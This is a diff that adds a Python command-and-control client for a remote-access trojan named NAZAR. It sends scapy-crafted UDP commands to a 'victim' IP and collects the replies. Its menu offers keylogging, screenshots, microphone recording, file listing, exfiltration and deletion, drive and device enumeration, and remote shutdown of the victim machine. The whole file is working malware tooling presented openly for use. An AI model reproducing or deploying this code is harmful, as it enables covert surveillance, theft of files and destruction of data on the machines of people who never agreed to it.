@@ -1,0 +1,103 @@
+from scapy.all import *
+import struct
+import socket
+import hexdump
+import argparse
+
+DST_PORT = 1234
+
+# 4000 is the usual port without sending files, but we use it for everything, because why not?
+SERVER_PORT = 4000
+
+# We want to make sure the ID has the little endian of it
+ID = struct.unpack('>H',struct.pack('<H',4000))[0]
+
+def get_response(sock, should_loop):
+    started = False
+    total_payload = b''
+    while(should_loop or not started):
+        try:
+            payload, client_address = sock.recvfrom(4096)
+        except ConnectionResetError:
+                payload, client_address = sock.recvfrom(4096)
+        
+        total_payload += payload
+        # Good enough stop condition
+        if (len(payload) >= 4
+            and payload[:3] == b'---'
+            and payload[4] >= ord('0')
+            and payload[4] <= ord('9')):
+
+            should_loop = False
+        started = True
+    hexdump.hexdump(total_payload)
+
+MENU = """Welcome to NAZAR. Please choose:
+          999 - Get a ping from the victim.
+          555 - Get information on the victim's machine.
+          311 - Start keylogging (312 to disable).
+          139 - Shutdown victim's machine.
+          189 - Screenshot (313 to disable).
+          119 - Record audio from Microphone (315 to disable).
+          199 - List drives.
+          200 - List recursivley from directory*.
+          201 - Send a file*.
+          209 - Remove file*.
+          599 - List devices.
+
+* (append a path, use double-backslashes)
+quit to Quit,
+help for this menu.
+            """
+
+def get_message():
+    while True:
+        curr_message = input('> ').strip()
+        if 'quit' in curr_message:
+            return None
+        if 'help' in curr_message:
+            print(MENU)
+        else:
+            return curr_message
+
+def get_sock():
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    server_address = '0.0.0.0'
+    server = (server_address, SERVER_PORT)
+    sock.bind(server)
+    return sock     
+
+def main(ip_addr):
+    sock = get_sock()
+    
+    print(MENU)
+    multi_packets = ["200","201", "119", "189", "311", "199", "599"]
+    single_packets = ["999", "555"]
+    all_commands = single_packets + multi_packets
+    while True:
+        
+        curr_message = get_message()
+        if not curr_message:
+            break
+        
+
+        # Send message using scapy
+        # Make sure the IP identification field is little endian of the port.
+        sr1(
+            IP(dst=ip_addr, id=ID)/
+            UDP(sport=SERVER_PORT,dport=1234)/
+            Raw(load=curr_message),
+            verbose=0
+        )
+
+        command = curr_message[:3]
+        if command not in all_commands:
+            continue
+        should_loop = command in multi_packets
+        get_response(sock, should_loop)
+
+if __name__ == '__main__':
+    parser = argparse.ArgumentParser(description="victim's IP")
+    parser.add_argument('ip')
+    args = parser.parse_args()
+    main(args.ip)
